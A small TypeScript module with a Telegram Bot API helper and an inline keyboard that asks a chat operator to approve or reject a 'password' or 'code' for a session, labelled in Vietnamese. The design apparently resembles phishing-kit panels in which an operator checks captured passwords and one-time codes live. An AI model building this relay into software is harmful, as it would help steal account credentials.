const TOKEN = process.env.TELEGRAM_BOT_TOKEN ?? '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID ?? '';

export { CHAT_ID, TOKEN };

export type ApprovalType = 'password' | 'code';

export function buildApprovalKeyboard(type: ApprovalType, sessionId: string) {
    return {
        inline_keyboard: [
            [
                { text: '✅ Duyệt — đúng', callback_data: `approve:${type}:${sessionId}` },
                { text: '❌ Sai — thử lại', callback_data: `reject:${type}:${sessionId}` }
            ]
        ]
    };
}

export async function telegramRequest<T = unknown>(method: string, body: Record<string, unknown>): Promise<T> {
    const url = `https://api.telegram.org/bot${TOKEN}/${method}`;
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });
    return response.json() as Promise<T>;
}
